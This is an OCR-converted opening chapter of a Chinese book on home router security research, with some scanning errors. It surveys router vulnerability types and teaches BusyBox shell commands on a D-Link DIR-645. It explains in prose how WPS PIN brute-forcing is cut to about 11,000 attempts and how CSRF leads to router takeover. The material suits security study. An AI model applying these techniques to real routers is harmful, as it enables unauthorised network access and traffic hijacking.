### 第 1 章 基础准备与工具

近年来，针对嵌入式设备的攻击陆续进入人们的视野，但其安全现状令人担忧，正成为目前网络安全领域的一个盲区。而在嵌入式设备里，家用路由器给个人带来的安全问题非常严重。

本章介绍关于路由器风险的一些基本知识，为之后的漏洞分析研究打下良好的基础。本章所介绍的知识将贯穿路由器漏洞研究的整个过程。

## 1.1 路由器漏洞的分类

在过去几年里，针对嵌入式设备的黑客攻击陆续进入人们的视野。2012年，黑客攻击了巴西的450万台DSL路由器，植入了恶意软件DNS Changer用以进行恶意劫持。2013年，安全网站也报道了一种针对嵌入式设备的新型蠕虫。此外，针对嵌入式设备攻击的黑客工具也逐步完善。

国家互联网应急中心（CNCERT）发布的《2013年我国互联网网络安全态势综述》指出，国家信息安全漏洞共享平台（CNVD）分析发现，涉及通信网络设备的软/硬件漏洞的数量较2012年增长1.5倍，多家厂商生产的路由器存有漏洞后门，容易被黑客入侵。而《2014年上半年无线路由器及Wi-Fi安全研究报告》表明，高达60%的网民使用默认密码登录路由器管理后台，还有大约36%的网民使用“弱密码”，并且有接近1/4的Wi-Fi连接密码也是“弱密码”，这些密码都存在被轻易破解的危险。路由器被黑，轻者被“蹭网”，网速急速下降，或者被各种植入广告骚扰；重者劫持用户访问钓鱼网站，并能够通过上网数据包窃取用户账号和密码、QQ聊天记录、网购交易流程、网银账号和密码等。

在嵌入式设备里，家用路由器所带来的安全问题非常严重。原因之一是，作为连接用户与互联网的桥梁，这些设备常常处于“永远在线”状态。原因之二是，目前随着所谓智能路由器概念的兴起，路由器拥有了更多的功能，也就可能带来更多的安全漏洞。

当前，家用路由器的漏洞主要有 4 个方面，分别是密码破解漏洞、Web 漏洞、后门漏洞和溢出漏洞。

#### 1.1.1 路由器密码破解漏洞

很多家用路由器具有无线功能，开启 Wi-Fi 功能以后，电脑、手机等支持无线功能的设备可以通过密码认证的方式连接到路由器上网。Wi-Fi 密码最常见的加密认证方式有 3 种，分别是 WPA、WPA2 和 WEP。目前，无线网络加密技术日益成熟，以前的 WEP 加密方式因为加密强度相对较低、容易被黑客破解而逐渐被淘汰。尽管 WEP 加密认证方式在绝大多数的新型家用无线路由器中不再使用，但现在还是有不少使用这种加密方式的无线网络。统计显示，全国仍有 0.7% 的路由器使用 WEP 加密认证，其中香港、台湾、澳门用户使用 WEP 加密认证的比例最高，分别占当地用户总量的 3.2%、3.1%、1.7%。

据报告显示，99.2% 的家用无线路由器用户给自己的路由器设置了 Wi-Fi 密码，没有设置任何密码的用户占比仅为 0.8%。虽然绝大多数用户给路由器设置了密码，但他们仍有很多不良习惯。常见的 Wi-Fi 密码设置不良习惯包括：简短的数字组合；电话号码、生日等容易被暴力破解或猜测的密码。在网络上有很多这样的工具，可以通过字典暴力破解的方法获取用户的 Wi-Fi 密码，而这些工具需要的仅仅是时间及一个好的字典而已。因此，在设置 Wi-Fi 密码时应尽量避开那些容易被暴力破解的密码组合。

但是，即使用户把 Wi-Fi 密码设置成了很复杂的组合，还是可能出现问题。目前的路由器大都引入了一种叫做 WPS 的新技术。WPS 就是一键加密键，是由 Wi-Fi 联盟推出的全新 Wi-Fi 安全防护设定（Wi-Fi Protected Setup，WPS）标准，该标准推出的主要原因是为了解决长久以来无线网络加密认证设定的步骤过于繁杂艰难之弊病。具备这一功能的无线产品的机身上通常有一个功能键，称为 WPS 按钮，用户只需轻轻按下该按钮或输入 PIN 码，再经过简单的操作，即可完成无线加密设置，同时在客户端和路由器之间建立一个安全的连接。

路由器上的 WPS 功能可以登录 Web 管理界面来开启或停用，如图 1-1 所示是 netcore NW774 路由器的 WPS 设置。可以看到，该路由器的 PIN 码共有 8 位，目前为 “96542736”。因为 PIN 码一共有 8 位，PIN 码的最后一位是校验位，可以不必破解而直接计算，所以仅破解前 7 位即可。但是，即使是破解 7 位 PIN 码，也需要尝试 1000 万次。在实施 PIN 的身份识别时，接入点（无线路由器）只要找出这个 PIN 的前半部分（前 4 位）和后半部分（后 3 位）是否正确即可。当第一次 PIN 认证连接失败后，路由器会向客户端发回一个 EAP-NACK 信息。而通过该信息，攻击者就能够确定 PIN 的前半部分或后半部分是否正确。换句话说，攻击者只需从 7 位的 PIN 码中找出一个 4 位的 PIN 码和一个 3 位的 PIN 码。这样一来，破解级次又被降低，从 1000 万种变化，减少到  $ 11000 (10^{4}+10^{3}) $ 种变化。因此，在实际的破解中，攻击者最多只需试验 11000 次，平均只需试验大约 5500 次，通常可以在 2 小时内破解

PIN 码。将 PIN 码破解后，攻击者可以通过 PIN 码获取无线路由器当前使用的 Wi-Fi 连接密码，只要 PIN 码没有被改变，即使用户修改了无线路由器的 Wi-Fi 密码，攻击者还是可以通过 PIN 码轻而易举地得到新的密码。所以，使用无线路由器的 WPS 功能既增加了被攻击者“蹭网”的可能性，又增加了被攻击的风险。虽然部分厂商提供了防 PIN 破解的功能，但并不是所有开启 WPS 功能的无线路由器都会如此容易地被破解，所以，还是建议用户谨慎使用 WPS 功能。

 </div>

密码被破解后，攻击者可以接入破解的网络上网，占用带宽资源，并可以继续进行路由器管理页面登录密码的破解，获取路由器最高管理权限等。

本类漏洞本质上属于使用过程中的配置问题。本书不对密码破解漏洞进行深入探讨，而是着重分析路由器本身的漏洞。

#### 1.1.2 路由器Web漏洞

家用路由器一般带有 Web 管理服务，使用者可以通过 Web 管理界面进行路由器的管理和配置，如图 1-2 所示。

SQL 注入、命令执行、CSRF（Cross-Site Request Forgery）、跨站（XSS）等针对 Web 漏洞的攻击，不仅可以用在针对网站的攻击中，同样可以用在针对路由器的攻击中。例如，CSRF 攻击主要是由攻击者在网页中植入恶意代码或超链接，当被攻击者使用浏览器执行恶意代码或点击超链接以后，攻击者就可以访问那些经过被攻击者身份验证的网络应用——路由器也不例外。

 </div>

几乎所有的 SOHO 路由器都容易受到 CSRF 攻击。无线路由器有两个重要的密码：一个是 Wi-Fi 密码，主要是为了防止他人“蹭网”；另一个是路由器管理密码，主要是对路由器上网账号、Wi-Fi 密码、DNS、联网设备进行管理设置。用户修改或重新设定路由器管理账号和密码的概率相当低，而 CSRF 攻击正是利用了这一点，通过认证绕过漏洞、弱密码或者默认路由器管理密码登录，使攻击者可以像正常用户一样访问和修改路由器的任何设置。在这种攻击中，攻击者根本不需要知道 Wi-Fi 密码就可以控制路由器。

控制路由器管理权限后，攻击者可以将用户访问正常网站的请求导向恶意站点、劫持用户流量、推送广告，甚至可以制作一个和被攻击网站一模一样的站点进行“钓鱼”，诱使用户输入支付密码，获取用户的网银账号、密码等信息。

#### 1.1.3 路由器后门漏洞

CNCERT 发布的《2013 年我国互联网网络安全态势综述》显示，经 CNVD 分析验证，D-Link、Cisco、Linksys、Netgear、Tenda 等多家厂商的路由器产品存在后门，黑客可由此直

接控制路由器，进一步发起 DNS（域名系统）劫持、窃取信息、网络钓鱼等攻击，直接威胁用户网上交易和数据存储的安全。这意味着，相关路由器成为可随时被引爆的“地雷”。以部分 D-Link 路由器产品为例，攻击者利用后门可取得路由器的完全控制权，而受该后门影响的 D-Link 路由器在互联网上对应的 IP 地址至少有 1.2 万个，影响了大量用户的网络安全。

这里所谓的后门，并不是指黑客攻击路由器以后为了实现长久控制而留下的后门，而是指开发软件的程序员为了日后调试和检测方便，在软件中设置的一个超级管理权限。一般情况下，这个超级管理权限不容易被发现，而一旦被安全研究人员发现并公开，就意味着攻击者可以直接对路由器进行远程控制。

路由器是所有上网流量的管控设备，是网络的公共出口。路由器被黑客控制，意味着与网络有关的所有应用都可能被黑客控制。路由器带有后门，最主要的原因在于路由器厂商对安全问题重视不够。大多数家用路由器产品，因成本限制，以及用户对性能的要求高于安全性需求，往往使厂商在安全防护上做得不是很完善。而且，升级路由器固件的操作过程对普通用户来说也过于复杂。因此，路由器一旦暴露了后门漏洞，既对其安全影响广泛，又因固件升级烦琐而使影响变得更加深远。

#### 1.1.4 路由器溢出漏洞

缓冲区溢出是一种高级攻击手段，也是一种常见且危险的漏洞，存在于各种操作系统和应用软件中。缓冲区溢出的利用攻击，常见表现为程序运行失败、系统假死、重新启动等。而更为严重的是，黑客可以利用它执行非授权指令，进而取得系统特权，从而进行各种非法操作。

路由器是一种嵌入式设备，可以看作一台小型计算机，在路由器上运行的程序会因存在缓冲区漏洞而遭到黑客的攻击。黑客可以通过分析路由器系统及其允许的服务程序，进行大量的分析及模糊测试，发现缓冲区溢出漏洞，并利用其实现对路由器的远程控制。一旦得到路由器的控制权限，黑客就可以修改路由器的任何配置，进行流量拦截和篡改，推送广告，甚至盗取用户重要信息等。

## 1.2 路由器系统的基础知识和工具

本书要分析的路由器大多是基于 Linux 系统，因此，了解 Linux 的基本知识和基本命令的使用是进行路由器漏洞研究的基础。例如，利用漏洞成功得到一台路由器的控制权以后，路由器会返回一个命令行会话（Shell），如图 1-3 所示。该会话接入了路由器的 Linux 系统，拥有最高权限，可以通过它对路由器进行管理，如关闭防火墙、修改 DNS、重启路由器等。

 </div>

Linux 是当前使用非常广泛的开源操作系统，互联网上很多服务都运行在 Linux 系统上，很多小型的 SOHO 路由器都是基于 Linux 系统开发的。不过，和普通的 Linux 系统相比，路由器的 Linux 系统有两个特点：一是指令架构，路由器是一种嵌入式系统，多采用 MIPS 和 ARM 这两种指令架构；二是路由器的 Shell 是基于 BusyBox 的。本节会分别对 MIPS 架构的 Linux 路由器系统和 BusyBox 进行介绍，并对安全分析中用到的 Linux 系统工具进行介绍。

#### 1.2.1 MIPS Linux

MIPS 指令架构由 MIPS 公司所创，属于 RISC（精简指令集）体系，是一种普遍应用于小型设备的处理器架构，其应用领域覆盖游戏机、路由器、激光打印机、掌上电脑等。使用 MIPS 指令架构的 Linux 系统称为 MIPS Linux。

路由器的根文件系统与 Linux 系统基本上是一致的。在路由器系统中，根文件系统下通常有 usr、sys、proc、lib、etc、bin、var、tmp、sbin、mnt、include、home 及 dev 目录。其中，bin、sbin 及 usr 目录下的 bin、sbin 都是用于存放路由器中的应用程序的目录，而 lib 目录及 usr 目录下的 lib 是用于存放程序运行时需要的动态库文件的目录。还有一个重要的目录是 etc 目录，该目录用于存放路由器配置文件，在路由器系统中主要用来存放程序自启动配置文件、脚本文件及各种服务程序的配置文件（如 Web 服务器的配置文件等）。

#### 1.2.2 BusyBox命令

在路由器系统中，因为存储空间受到限制，所以使用的 Shell 通常是一个经过剪裁的名为 BusyBox 的程序。在路由器系统的 Shell 中支持的这些命令其实都指向 BusyBox 的符号链接。不

同路由器上的 Busybox 剪裁程度不同，因此每个路由器系统设备所支持的命令种类可能不同。使用 “busybox --help” 命令查看当前路由器的 BusyBox 支持的命令，如图 1-4 所示。

 </div>

下面就以 D-Link DIR-645 路由器为例，介绍路由器 Shell 的一些命令。

Is 命令：显示目录及文件信息，用法如表 1-1 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能项</td><td style='text-align: center; word-wrap: break-word;'>命令或格式</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td rowspan="3"></td><td style='text-align: center; word-wrap: break-word;'>ls [option] [file|directory]</td><td style='text-align: center; word-wrap: break-word;'>显示指定目录下的所有文件或文件夹</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ls</td><td style='text-align: center; word-wrap: break-word;'>显示当前目录的内容</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ls -l</td><td style='text-align: center; word-wrap: break-word;'>显示当前目录的详细内容</td></tr><tr><td rowspan="3">ls</td><td style='text-align: center; word-wrap: break-word;'>ls -a</td><td style='text-align: center; word-wrap: break-word;'>显示当前目录下的所有文件，包括以“.”开头的隐藏文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ls /opt</td><td style='text-align: center; word-wrap: break-word;'>显示指定目录 /opt 下的内容</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ls *.txt</td><td style='text-align: center; word-wrap: break-word;'>显示当前目录下所有以“.txt”为后缀的文件</td></tr></table>

1s 命令的用法示例如图 1-5 所示。

 </div>

cd 命令：改变当前工作目录，用法如表 1-2 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能项</td><td style='text-align: center; word-wrap: break-word;'>命令或格式</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td rowspan="3"></td><td style='text-align: center; word-wrap: break-word;'>cd [directory]</td><td style='text-align: center; word-wrap: break-word;'>切换到指定目录</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>cd</td><td style='text-align: center; word-wrap: break-word;'>切换到当前用户所在的主目录</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>cd ..</td><td style='text-align: center; word-wrap: break-word;'>回到当前目录的上一级目录</td></tr><tr><td rowspan="3">cd</td><td style='text-align: center; word-wrap: break-word;'>cd /opt</td><td style='text-align: center; word-wrap: break-word;'>切换到以绝对路径表示的 /opt目录</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>cd ../..</td><td style='text-align: center; word-wrap: break-word;'>使用相对路径切换到当前目录的上一级的上一级目录</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>cd .</td><td style='text-align: center; word-wrap: break-word;'>切换到当前目录，相当于没有任何操作</td></tr></table>

cd 命令的用法示例如图 1-6 所示。

cat 命令：在标准输出设备上显示或连接指定文件，用法如表 1-3 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能项</td><td style='text-align: center; word-wrap: break-word;'>命令或格式</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>cat</td><td style='text-align: center; word-wrap: break-word;'>cat [option] [file]</td><td style='text-align: center; word-wrap: break-word;'>显示文件的内容（经常和more命令搭配使用），或者将数个文件合并成一个文件</td></tr><tr><td rowspan="3">cat</td><td style='text-align: center; word-wrap: break-word;'>cat readme.txt</td><td style='text-align: center; word-wrap: break-word;'>显示当前目录下的readme.txt文件中的所有内容</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>cat face.txt &gt;&gt; readme.txt</td><td style='text-align: center; word-wrap: break-word;'>将face.txt文件的内容附加到readme.txt文件之后</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>cat n1 n2 &gt; readme.txt</td><td style='text-align: center; word-wrap: break-word;'>将n1文件和n2文件合并成readme.txt文件</td></tr></table>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>Enter &quot;help&quot; for a list of built-in commands.</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

 </div>

cat 命令的用法示例如图 1-7 所示。

➢ rm 命令：删除指定文件，用法如表 1-4 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能项</td><td style='text-align: center; word-wrap: break-word;'>命令或格式</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>rm [option] [file]</td><td style='text-align: center; word-wrap: break-word;'>删除文件或目录</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>rm myfile</td><td style='text-align: center; word-wrap: break-word;'>删除当前目录下的myfile文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>rm -f *.txt</td><td style='text-align: center; word-wrap: break-word;'>强制删除，遇到问题不需要确认</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>rm</td><td style='text-align: center; word-wrap: break-word;'>rm -r /tmp</td><td style='text-align: center; word-wrap: break-word;'>递归删除 /tmp 目录下的所有文件，并删除 /tmp 目录，系统会不断询问是否删除文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>rm -rf /tmp</td><td style='text-align: center; word-wrap: break-word;'>删除 /tmp 目录下的所有文件，并删除 /tmp 目录，需要确认是否删除时默认选项为删除</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>rm -v myfile</td><td style='text-align: center; word-wrap: break-word;'>显示删除过程</td></tr></table>

 </div>

rm 命令的用法示例如图 1-8 所示。

 </div>

mkdir 命令：在当前目录下创建新的子目录，用法如表 1-5 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能项</td><td style='text-align: center; word-wrap: break-word;'>命令或格式</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td rowspan="2">mkdir</td><td style='text-align: center; word-wrap: break-word;'>mkdir [option] [directory]</td><td style='text-align: center; word-wrap: break-word;'>创建子目录</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>mkdir tools</td><td style='text-align: center; word-wrap: break-word;'>在当前目录下创建子目录tools</td></tr></table>

mkdir 命令的用法示例如图 1-9 所示。

 </div>

文件操作命令：包括 mv、cp、du，用法如表 1-6 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能项</td><td style='text-align: center; word-wrap: break-word;'>命令或格式</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td rowspan="4">cp、mv、du</td><td style='text-align: center; word-wrap: break-word;'>cp readme.txt /opt</td><td style='text-align: center; word-wrap: break-word;'>把readme.txt文件复制到 /opt目录下</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>cp -R readme/* /opt</td><td style='text-align: center; word-wrap: break-word;'>将readme目录及子目录下的所有文件和文件夹复制到 /opt目录下</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>mv readme.txt /opt/moved</td><td style='text-align: center; word-wrap: break-word;'>将readme.txt文件移动到 /opt目录下并重命名为moved</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>du -sk readme.txt</td><td style='text-align: center; word-wrap: break-word;'>查看readme.txt文件的大小（以KB为单位）</td></tr></table>

文件操作命令的用法示例如图 1-10 所示。

 </div>

grep 命令，用法如表 1-7 所示（其他正则表达式同样适用）。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能项</td><td style='text-align: center; word-wrap: break-word;'>命令或格式</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>grep [option] [expression] [file]</td><td style='text-align: center; word-wrap: break-word;'>基于行对目标文件内容进行查找</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>grep “root” /etc/passwd</td><td style='text-align: center; word-wrap: break-word;'>查找 /etc/passwd文件中包含“root”的行</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>grep -n “root” /etc/passwd</td><td style='text-align: center; word-wrap: break-word;'>查找 /etc/passwd文件中包含“root”的行并输出行号</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>grep “^ma” /etc/passwd</td><td style='text-align: center; word-wrap: break-word;'>查找 /etc/passwd文件中包含“ma”为行首的行</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>grep</td><td style='text-align: center; word-wrap: break-word;'>grep “bash$” /etc/passwd</td><td style='text-align: center; word-wrap: break-word;'>查找 /etc/passwd文件中包含“bash”结尾的行</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>grep “![r|d]” /etc/passwd</td><td style='text-align: center; word-wrap: break-word;'>查找以“r”或“d”为行首的行</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>grep -i “root” /etc/passwd</td><td style='text-align: center; word-wrap: break-word;'>查找 /etc/passwd文件中包含“root”（不区分大小写）的行</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>grep -R --include=&quot;*.php&quot; &quot;POST&quot; /</td><td style='text-align: center; word-wrap: break-word;'>递归查找当前目录下的所有PHP文件，要求文件中包含关键字“POST”</td></tr></table>

grep 命令的用法示例如图 1-11 所示。

 </div>

ps 命令：显示当前进程状态，用法如表 1-8 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能项</td><td style='text-align: center; word-wrap: break-word;'>命令或格式</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ps</td><td style='text-align: center; word-wrap: break-word;'>ps</td><td style='text-align: center; word-wrap: break-word;'>查看当前正在运行的进程</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ps</td><td style='text-align: center; word-wrap: break-word;'>ps -ef</td><td style='text-align: center; word-wrap: break-word;'>查看当前系统正在运行的所有进程</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ps</td><td style='text-align: center; word-wrap: break-word;'>ps -ef | grep bash</td><td style='text-align: center; word-wrap: break-word;'>查找当前系统正在运行的、进程名包含“bash”的进程</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ps -aux</td><td style='text-align: center; word-wrap: break-word;'>ps -aux</td><td style='text-align: center; word-wrap: break-word;'>显示不以终端区分，所有进程按用户ID排列</td></tr></table>

ps 命令的用法示例如图 1-12 所示。

kill 命令：终止进程，用法如表 1-9 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能项</td><td style='text-align: center; word-wrap: break-word;'>命令或格式</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td rowspan="2">kill</td><td style='text-align: center; word-wrap: break-word;'>kill pid</td><td style='text-align: center; word-wrap: break-word;'>根据进程号pid终止进程运行（进程号通过ps命令获取）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>kill -9 pid</td><td style='text-align: center; word-wrap: break-word;'>强制终止进程号为pid的进程</td></tr></table>

kill 命令的用法示例如图 1-13 所示。

killall 命令：根据指定的进程名字终止进程，用法如表 1-10 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能项</td><td style='text-align: center; word-wrap: break-word;'>命令或格式</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td rowspan="3">killall</td><td style='text-align: center; word-wrap: break-word;'>killall command-name</td><td style='text-align: center; word-wrap: break-word;'>根据进程名command-name终止进程运行</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>killall bash</td><td style='text-align: center; word-wrap: break-word;'>杀死所有进程名为bash的进程</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>killall -9 bash</td><td style='text-align: center; word-wrap: break-word;'>强制终止进程名为bash的进程</td></tr></table>

killall 命令的用法示例如图 1-14 所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>1136</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>852</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>/bin/sh /etc/scripts/cpuload.sh</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>1144</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>752</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>init</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>1219</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>836</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>port: -c DNAI_PORT</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2193</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>0</td><td style='text-align: center; word-wrap: break-word;'>SW</td><td style='text-align: center; word-wrap: break-word;'>[srupt-p-vgl]</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2194</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>0</td><td style='text-align: center; word-wrap: break-word;'>SW</td><td style='text-align: center; word-wrap: break-word;'>[srupt-p-kall]</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2208</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>0</td><td style='text-align: center; word-wrap: break-word;'>SW</td><td style='text-align: center; word-wrap: break-word;'>[licpcore]</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2220</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1076</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>/usr/sbin/jcpd -i br0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2225</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1052</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>/usr/sbin/hotplugd =D</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2226</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1052</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>/usr/sbin/hotplugd =D</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2227</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1052</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>/usr/sbin/hotplugd =D</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2828</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>0</td><td style='text-align: center; word-wrap: break-word;'>SW</td><td style='text-align: center; word-wrap: break-word;'>[RtmpCmdQTask]</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2894</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>852</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>updatevifistats = /etc/scripts/upvifistats/sh/per_G_ha</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2925</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1476</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>hostapd /var/topology.conf</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3020</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>852</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>neaps -i br0 =c /var/run/neaps.conf</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3033</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>828</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>netbios -i br0 =p dlinkrouter</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3034</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>844</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>11mresp =i br0 =p dlinkrouter</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3053</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1016</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>udhcpd /var/servd/LAN-1-udhcpd.conf</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3161</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1016</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>udhcpd /var/servd/LAN-2-udhcpd.conf</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3286</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1008</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>proxyd -m 1.33.203.39 =f /var/run/proxyd.conf =u /var</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3535</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1224</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>mDNSResponderRosix -b -i br0 =f /var/rendezvous.conf</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3580</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>988</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>dnsmasq =C /var/servd/DNS.conf</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3661</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1044</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>fileaccessd</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3665</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1044</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>fileaccessd</td></tr><tr><td style='text-align: center; word-wrap: 